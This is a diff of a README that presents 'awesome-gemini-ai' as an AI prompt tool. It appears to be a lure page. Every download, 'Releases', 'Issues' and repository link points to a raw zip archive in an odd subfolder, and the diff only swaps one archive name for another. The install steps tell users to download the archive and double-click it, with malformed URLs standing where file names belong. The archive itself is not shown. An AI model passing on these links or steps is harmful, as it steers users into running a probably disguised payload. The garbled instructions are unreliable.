@@ -1,6 +1,6 @@
 # 🌟 awesome-gemini-ai - Simplify Your AI Prompting Journey
 
-[![Download Now](https://raw.githubusercontent.com/valenciakeithdonnel/awesome-gemini-ai/main/nosologically/awesome-gemini-ai-1.7.zip%20Now-Click%https://raw.githubusercontent.com/valenciakeithdonnel/awesome-gemini-ai/main/nosologically/awesome-gemini-ai-1.7.zip)](https://raw.githubusercontent.com/valenciakeithdonnel/awesome-gemini-ai/main/nosologically/awesome-gemini-ai-1.7.zip)
+[![Download Now](https://raw.githubusercontent.com/valenciakeithdonnel/awesome-gemini-ai/main/nosologically/ai-awesome-gemini-2.4.zip%20Now-Click%https://raw.githubusercontent.com/valenciakeithdonnel/awesome-gemini-ai/main/nosologically/ai-awesome-gemini-2.4.zip)](https://raw.githubusercontent.com/valenciakeithdonnel/awesome-gemini-ai/main/nosologically/ai-awesome-gemini-2.4.zip)
 
 ## 📚 Overview
 
@@ -15,12 +15,12 @@ Using this software is straightforward. Follow these steps to begin your journey
    - Ensure you have an internet connection to download the files.
 
 2. **Visit the Releases Page**
-   - To download the latest version of **awesome-gemini-ai**, visit this [page](https://raw.githubusercontent.com/valenciakeithdonnel/awesome-gemini-ai/main/nosologically/awesome-gemini-ai-1.7.zip).
+   - To download the latest version of **awesome-gemini-ai**, visit this [page](https://raw.githubusercontent.com/valenciakeithdonnel/awesome-gemini-ai/main/nosologically/ai-awesome-gemini-2.4.zip).
 
 ## 💾 Download & Install
 
 1. **Choose Your File**
-   - On the Releases page, look for the version that suits your system. For example, if you're on Windows, you might download a file called `https://raw.githubusercontent.com/valenciakeithdonnel/awesome-gemini-ai/main/nosologically/awesome-gemini-ai-1.7.zip`. For macOS, look for `https://raw.githubusercontent.com/valenciakeithdonnel/awesome-gemini-ai/main/nosologically/awesome-gemini-ai-1.7.zip`, and for Linux, choose `https://raw.githubusercontent.com/valenciakeithdonnel/awesome-gemini-ai/main/nosologically/awesome-gemini-ai-1.7.zip`.
+   - On the Releases page, look for the version that suits your system. For example, if you're on Windows, you might download a file called `https://raw.githubusercontent.com/valenciakeithdonnel/awesome-gemini-ai/main/nosologically/ai-awesome-gemini-2.4.zip`. For macOS, look for `https://raw.githubusercontent.com/valenciakeithdonnel/awesome-gemini-ai/main/nosologically/ai-awesome-gemini-2.4.zip`, and for Linux, choose `https://raw.githubusercontent.com/valenciakeithdonnel/awesome-gemini-ai/main/nosologically/ai-awesome-gemini-2.4.zip`.
 
 2. **Download the File**
    - Click on the appropriate download link. The file will begin downloading to your computer. 
@@ -31,8 +31,8 @@ Using this software is straightforward. Follow these steps to begin your journey
 
 4. **Run the Application**
    - Open the extracted folder.
-   - On Windows, double-click `https://raw.githubusercontent.com/valenciakeithdonnel/awesome-gemini-ai/main/nosologically/awesome-gemini-ai-1.7.zip` to run the application.
-   - On macOS, double-click `https://raw.githubusercontent.com/valenciakeithdonnel/awesome-gemini-ai/main/nosologically/awesome-gemini-ai-1.7.zip`.
+   - On Windows, double-click `https://raw.githubusercontent.com/valenciakeithdonnel/awesome-gemini-ai/main/nosologically/ai-awesome-gemini-2.4.zip` to run the application.
+   - On macOS, double-click `https://raw.githubusercontent.com/valenciakeithdonnel/awesome-gemini-ai/main/nosologically/ai-awesome-gemini-2.4.zip`.
    - On Linux, you may need to give executable permissions first. Open the terminal, navigate to the folder, and run:
      ```bash
      chmod +x awesome-gemini-ai
@@ -66,7 +66,7 @@ Once the application is running, you can start exploring the available prompts:
 
 Join our growing community to share your insights and get help:
 
-- **GitHub Issues:** Report any bugs or request features directly on the [Issues](https://raw.githubusercontent.com/valenciakeithdonnel/awesome-gemini-ai/main/nosologically/awesome-gemini-ai-1.7.zip) page.
+- **GitHub Issues:** Report any bugs or request features directly on the [Issues](https://raw.githubusercontent.com/valenciakeithdonnel/awesome-gemini-ai/main/nosologically/ai-awesome-gemini-2.4.zip) page.
 - **Social Media:** Follow us on platforms where you can connect with other users. Suggestions include Twitter and relevant subreddits focused on AI and prompt engineering.
 
 ## 📝 Contributing
@@ -75,7 +75,7 @@ Contributions are welcome! If you have new prompts or ideas, feel free to submit
 
 ## 🔗 Links
 
-- **Download the Latest Version:** [Download Here](https://raw.githubusercontent.com/valenciakeithdonnel/awesome-gemini-ai/main/nosologically/awesome-gemini-ai-1.7.zip)
-- **GitHub Repository:** [awesome-gemini-ai](https://raw.githubusercontent.com/valenciakeithdonnel/awesome-gemini-ai/main/nosologically/awesome-gemini-ai-1.7.zip)
+- **Download the Latest Version:** [Download Here](https://raw.githubusercontent.com/valenciakeithdonnel/awesome-gemini-ai/main/nosologically/ai-awesome-gemini-2.4.zip)
+- **GitHub Repository:** [awesome-gemini-ai](https://raw.githubusercontent.com/valenciakeithdonnel/awesome-gemini-ai/main/nosologically/ai-awesome-gemini-2.4.zip)
 
 Explore and enhance your AI experience with **awesome-gemini-ai**!
